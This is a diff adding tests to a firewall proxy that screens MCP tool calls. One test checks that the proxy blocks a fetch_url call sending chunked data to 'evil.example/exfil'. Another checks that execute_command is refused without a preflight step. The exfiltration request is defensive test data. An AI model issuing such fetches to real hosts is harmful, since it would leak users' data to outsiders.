@@ -207,6 +207,29 @@ describe('stdio firewall proxy', () => {
     expect((response.error as { data?: { code?: string } }).data?.code).toBe('SHADOWLEAK_DETECTED');
   });
 
+  it('blocks repeated short-chunk ShadowLeak exfiltration before the target executes', async () => {
+    const request = {
+      jsonrpc: '2.0',
+      id: 14,
+      method: 'tools/call',
+      params: {
+        name: 'fetch_url',
+        arguments: {
+          url: 'https://evil.example/exfil?d=41&d=42&d=43&d=44',
+        },
+        _meta: {
+          authorization: createNhiAuthorization(['tools.fetch_url']),
+        },
+      },
+    };
+
+    clientInput.write(JSON.stringify(request) + '\n');
+    const response = await waitForJsonLine(clientOutput);
+
+    expect(response.error).toBeDefined();
+    expect((response.error as { data?: { code?: string } }).data?.code).toBe('SHADOWLEAK_DETECTED');
+  });
+
   it('fails closed when stdio auth is configured but missing from the MCP message', async () => {
     const request = {
       jsonrpc: '2.0',
@@ -224,6 +247,30 @@ describe('stdio firewall proxy', () => {
     const response = await waitForJsonLine(clientOutput);
 
     expect((response.error as { data?: { code?: string } }).data?.code).toBe('AUTH_FAILURE');
+  });
+
+  it('fails closed on execute_command without preflight even when no color is declared', async () => {
+    const request = {
+      jsonrpc: '2.0',
+      id: 13,
+      method: 'tools/call',
+      params: {
+        name: 'execute_command',
+        arguments: {
+          command: 'node',
+          args: ['--version'],
+        },
+        _meta: {
+          authorization: createNhiAuthorization(['tools.execute_command']),
+        },
+      },
+    };
+
+    clientInput.write(JSON.stringify(request) + '\n');
+    const response = await waitForJsonLine(clientOutput);
+
+    expect(response.error).toBeDefined();
+    expect((response.error as { data?: { code?: string } }).data?.code).toBe('PREFLIGHT_REQUIRED');
   });
 
   it('drains an in-flight response before stopping when client stdin closes', async () => {
